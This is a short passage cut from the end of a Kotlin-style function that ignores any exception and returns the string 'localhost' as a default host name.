    } catch (_: Exception) { }
    return "localhost"
}
